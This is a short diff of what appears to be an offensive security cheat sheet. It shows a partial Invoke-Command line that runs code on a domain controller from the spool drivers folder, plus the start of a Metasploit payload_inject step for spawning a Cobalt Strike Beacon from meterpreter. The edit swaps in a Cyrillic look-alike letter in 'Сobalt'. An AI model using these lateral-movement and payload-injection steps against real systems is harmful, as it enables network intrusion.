@@ -299,7 +299,7 @@ Invoke-Command -ComputerName DC -ScriptBlock { C:\Windows\System32\spool\drivers
 
 MSF and Cobalt are friend's forever
 
-Spawn BEACON from meterpreter to cobalt strike
+Spawn BEACON from meterpreter to Сobalt Strike
 
 ```
 use exploit/windows/local/ payload_inject
